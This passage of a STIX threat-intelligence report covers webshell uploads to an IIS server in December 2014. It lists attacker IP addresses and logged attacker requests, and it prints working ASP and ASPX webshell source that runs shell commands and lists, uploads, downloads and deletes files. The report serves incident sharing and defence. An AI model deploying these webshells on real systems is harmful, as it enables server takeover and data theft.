POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

t=d&amp;f=C:\serveradministrator\docs</indicator:Description><indicator:Observable id="CISCP:Observable-bfb3e4b2-3e39-4c30-b4d5-ba13dff1779c"><cybox:Object id="CISCP:Object-38d83f3e-e7fa-475a-8f75-68f775ef9a01"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">94.229.74.91</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-10T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-e47fb342-dac9-40e9-ac44-e160f1d4642a" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 10 Dec, 2014, this IP address, along with 94.229.74.91, was observed uploading webshells (base64 encoded) to the server via SOAP function calls. This activity was immediately detected and remediated.

Webshell details are as follows:

C:\INETPUB\WWWROOT\[webserver]ADMINEXT\FILEINFO.asp
C:\INETPUB\WWWROOT\AVHUBLOG.asp
C:\INETPUB\WWWROOT\AVLOG.asp
C:\INETPUB\WWWROOT\CORETMPCORE.txt
C:\INETPUB\WWWROOT\services.asp
C:\INETPUB\WWWROOT\AVLOG.asp

Contents of avlog.asp
&lt;%
Set oSc = Server.CreateObject("WSCRIPT.SHELL")
oout = ""
mc = request("mc")
If (mc &lt;&gt; "") Then
  Set res = oSc.Exec("cmd.exe /c """&amp;mc&amp;"""")
  oout = res.stdout.readall + res.stderr.readall 
End If
%&gt;
&lt;plaintext&gt;&lt;%
If (oout &lt;&gt; "") Then
  Response.Write oout
End If
%&gt;

Contents of avhublog.asp:
&lt;%
If request("t")="d" then
	Set l=CreateObject("Scripting.FileSystemObject").GetFolder(request("f"))
	o=""
	for each e in l.SubFolders
	o=o&amp;"&lt;a href=""?t=d&amp;f="&amp;server.URLencode(e.path)&amp;"""&gt;"&amp;e.Name&amp;"&lt;/a&gt;&lt;br&gt;"
	next
	for each e in l.Files
	o=o&amp;"&lt;a href=""sld.cer?f="&amp;server.URLencode(e.path)&amp;"&amp;fn="&amp;server.URLencode(e.Name)&amp;"""&gt;"&amp;e.Name&amp;":"&amp;e.Size&amp;"&lt;/a&gt;&lt;br&gt;"
	next
	Response.Write(o)
End If
%&gt;

Partial contents of fileinfo.asp
&lt;%
f = Request("f")
If f &lt;&gt; "" Then
    Set o = Server.CreateObject("ADODB.Stream")
    o.Type = 1
    o.Open
    o.LoadFromFile(f)
    Response.ContentType = "application/x-unknown"
    Response.Addheader "Content-Disposition", "attachment; filename=" &amp; Request("fn")
    Response.AddHeader "Content-Length", o.Size
    Do While Not o.EOS And Response.IsClientConnected
        Response.BinaryWrite o.Read(1024)
        Response.Flus

 12.) Impact from this incident. : Low: limited adverse effect
 13.) Incident Description (Shared) : 
     Continuation from previous section above:

Attempted webshell interaction:
1)
POST /avlog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

t=d&amp;f=C:\inetpub\wwwroot

2)
POST /avlog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

mc=whoami

3)
POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

t=d&amp;f=C:\inetpub\wwwroot\[redacted]adminext

4)
POST /avlog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

t=d&amp;f=C:\[redacted].rtf

5)
POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

t=d&amp;f=C:\keyfiles

6)
POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

t=d&amp;f=C:\serveradministrator

7)
POST /avhublog.asp HTTP/1.1
Host: [redacted]
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

t=d&amp;f=C:\serveradministrator\docs</indicator:Description><indicator:Observable id="CISCP:Observable-52e08346-8ca9-410a-8032-e9871dfdde17"><cybox:Object id="CISCP:Object-9dd17904-09cf-4e4e-9858-25ae2fde5266"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">84.39.117.57</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-10T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-dc37c458-caee-46d8-bacf-13b55604d426" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 11 Dec 2014, access was attempted again via SOAP function calls, and an attempt to upload a web shell (base64 encoded) was detected. This IP address, along with those below, were seen attempting to execute SOAP functions on the server:

46.29.125.14   
198.203.28.43
46.165.208.105

Webshell details are as follows:

----- BEGIN CODE -----
\Inetpub\wwwroot\tier_7.aspx
Content:
&lt;%@ Page Language="C#" EnableViewState="false" %&gt;
&lt;%@ Import Namespace="System.Web.UI.WebControls" %&gt;
&lt;%@ Import Namespace="System.Diagnostics" %&gt;
&lt;%@ Import Namespace="System.IO" %&gt;

&lt;%
  string outstr = "";
  
  string dir = Page.MapPath(".") + "/";
  if (Request.QueryString["fdir"] != null)
    dir = Request.QueryString["fdir"] + "/";
  dir = dir.Replace("\\", "/");
  dir = dir.Replace("//", "/");
  
  string[] dirparts = dir.Split('/');
  string linkwalk = "";  
  foreach (string curpart in dirparts)
  {
    if (curpart.Length == 0)
      continue;
    linkwalk += curpart + "/";
    outstr += string.Format("&lt;a href='?fdir={0}'&gt;{1}/&lt;/a&gt; ",
                  HttpUtility.UrlEncode(linkwalk),
                  HttpUtility.HtmlEncode(curpart));
  }
  lblPath.Text = outstr;
  
  outstr = "";
  foreach(DriveInfo curdrive in DriveInfo.GetDrives())
  {
    if (!curdrive.IsReady)
      continue;
    string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
    outstr += string.Format("&lt;a href='?fdir={0}'&gt;{1}&lt;/a&gt; ",
                  HttpUtility.UrlEncode(driveRoot),
                  HttpUtility.HtmlEncode(driveRoot));
  }
  lblDrives.Text = outstr;

  if ((Request.QueryString["get"] != null) &amp;&amp; (Request.QueryString["get"].Length &gt; 0))
  {
    Response.ClearContent();
    Response.WriteFile(Request.QueryString["get"]);
    Response.End();
  }

  if ((Request.QueryString["del"] != null) &amp;&amp; (Request.QueryString["del"].Length &gt; 0))
    File.Delete(Request.QueryString["del"]);  

  if(flUp.HasFile)
  {
    string fileName = flUp.FileName;
    int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
    if (splitAt &gt;= 0)
      fileName = flUp.FileName.Substring(splitAt);
    flUp.SaveAs(dir + "/" + fileName);
  }

  DirectoryInfo di = new DirectoryInfo(dir);
  outstr = "";
  foreach (DirectoryInfo curdir in di.GetDirectories())
  {
    string fstr = string.Format("&lt;a href='?fdir={0}'&gt;{1}&lt;/a&gt;",
                  HttpUtility.UrlEncode(dir + "/" + curdir.Name),
                  HttpUtility.HtmlEncode(curdir.Name));
    outstr += string.Format("&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;td&gt;&lt;DIR&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;", fstr);
  }
  foreach (FileInfo curfile in di.GetFiles())
  {
    string fstr = string.Format("&lt;a href='?get={0}' target='_blank'&gt;{1}&lt;/a&gt;",
                  HttpUtility.UrlEncode(dir + "/" + curfile.Name),
                  HttpUtility.HtmlEncode(curfile.Name));
    string astr = string.Format("&lt;a href='?fdir={0}&amp;del={1}'&gt;Del&lt;/a&gt;",
                  HttpUtility.UrlEncode(dir),
                  HttpUtility.UrlEncode(dir + "/" + curfile.Name));
    outstr += string.Format("&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;td&gt;{1:d}&lt;/td&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;", fstr, curfile.Length / 1024, astr);
  }
  lblDirOut.Text = outstr;

  // exec cmd ?
  if (txtCmdIn.Text.Length &gt; 0)
  {
    Process p = new Process();
    p.StartInfo.CreateNoWindow = true;
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.StartInfo.WorkingDirectory = dir;
    p.Start();

    lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
    txtCmdIn.Text = "";
  }  
%&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;aspx&lt;/title&gt;
  &lt;style type="text/css"&gt;
    * { font-family: Arial; font-size: 12px; }
    body { margin: 0px; }
    pre { font-family: Courier New; background-color: #CCCCCC; }
    h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
    h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
    th { text-align: left; background-color: #99CC99; }
    td { background-color: #CCFFCC; }
    pre { margin: 2px; }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;form id="form1" runat="server"&gt;
    &lt;table style="width: 100%; border-width: 0px; padding: 5px;"&gt;
    &lt;tr&gt;
      &lt;td style="width: 50%; vertical-align: top;"&gt;
        &lt;asp:TextBox runat="server" ID="txtCmdIn" Width="300" /&gt;
        &lt;asp:Button runat="server" ID="cmdExec" Text="Execute" /&gt;
        &lt;pre&gt;&lt;asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /&gt;&lt;/pre&gt;
      &lt;/td&gt;
      &lt;td style="width: 50%; vertical-align: top;"&gt;
        &lt;p&gt;
          Drives:&lt;br /&gt;
          &lt;asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" /&gt;
        &lt;/p&gt;
        &lt;p&gt;
          &lt;b&gt;&lt;asp:Literal runat="server" ID="lblPath" Mode="passThrough" /&gt;&lt;/b&gt;
        &lt;/p&gt;
        &lt;table style="width: 100%"&gt;
          &lt;tr&gt;
            &lt;th&gt;Name&lt;/th&gt;
            &lt;th&gt;Size KB&lt;/th&gt;
            &lt;th style="width: 50px"&gt;Actions&lt;/th&gt;
          &lt;/tr&gt;
          &lt;asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" /&gt;
        &lt;/table&gt;
        &lt;asp:FileUpload runat="server" ID="flUp" /&gt;
        &lt;asp:Button runat="server" ID="cmdUpload" Text="Upload" /&gt;
        &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/table&gt;

    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
-----  END CODE  -----</indicator:Description><indicator:Observable id="CISCP:Observable-8286ad73-764c-4b0d-9860-893f49881273"><cybox:Object id="CISCP:Object-9db441d6-dea8-4b86-9b14-c0f44c9b8246"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">108.59.8.182</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-11T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-c2f27597-5670-466b-bf7a-214f2699a000" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 11 Dec 2014, access was attempted again via SOAP function calls, and an attempt to upload a web shell (base64 encoded) was detected. This IP address, along with those below, were seen attempting to execute SOAP functions on the server:

108.59.8.182 
198.203.28.43
46.165.208.105

On 17 Dec 2014, access was attempted (unsuccessfully) by this IP address again, along with 178.168.198.45, using SOAP function calls.


See the IP indicator for 108.59.8.182 to see the Webshell code details.</indicator:Description><indicator:Observable id="CISCP:Observable-92094962-89a4-47fc-bbf4-1026caf85f08"><cybox:Object id="CISCP:Object-58d31a48-749d-4d23-992d-8a93a881276a"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">46.29.125.14</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-11T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-a8ecc7ca-0912-4855-b511-7804654d2a8c" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 11 Dec 2014, access was attempted again via SOAP function calls, and an attempt to upload a web shell (base64 encoded) was detected. This IP address, along with those below, were seen attempting to execute SOAP functions on the server:

108.59.8.182
46.29.125.14
46.165.208.105

See the IP indicator for 108.59.8.182 to see the Webshell code details.</indicator:Description><indicator:Observable id="CISCP:Observable-d21e25ec-a2bd-48c5-8ee2-f86a6cfc1c10"><cybox:Object id="CISCP:Object-ae704d2a-7906-48d2-bfa4-697d158f1392"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">198.203.28.43</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-11T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-d786bde9-613c-4f61-ab8a-01079d905ab5" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 11 Dec 2014, access was attempted again via SOAP function calls, and an attempt to upload a web shell (base64 encoded) was detected. This IP address, along with those below, were seen attempting to execute SOAP functions on the server:

108.59.8.182
46.29.125.14   
198.203.28.43

See the IP indicator for 108.59.8.182 to see the Webshell code details.</indicator:Description><indicator:Observable id="CISCP:Observable-52982e21-91cc-4840-a1dc-9ab3018357c1"><cybox:Object id="CISCP:Object-7266c72a-27e9-4d6f-bf09-3be5296e43d8"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">46.165.208.105</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-11T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-35e67f93-b6b0-4a10-aeda-fb9a2f0a60bf" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">IP Watchlist</indicator:Type><indicator:Description>On 17 Dec 2014, access was attempted (unsuccessfully) by this IP address, along with 46.29.125.14, using SOAP function calls.</indicator:Description><indicator:Observable id="CISCP:Observable-13349f08-158f-468d-b03d-48e9c494cd0f"><cybox:Object id="CISCP:Object-3f862c6d-d8fb-48ae-9015-4b7a7a49820f"><cybox:Properties category="ipv4-addr" xsi:type="AddressObj:AddressObjectType"><AddressObj:Address_Value condition="Equals">178.162.198.45</AddressObj:Address_Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2014-12-17T00:00:00"/></indicator:Sightings></stix:Indicator></stix:Indicators><stix:TTPs><stix:Kill_Chains><stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf"><stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/><stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/><stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/><stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/><stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/><stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/><stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/></stixCommon:Kill_Chain></stix:Kill_Chains></stix:TTPs></stix:STIX_Package>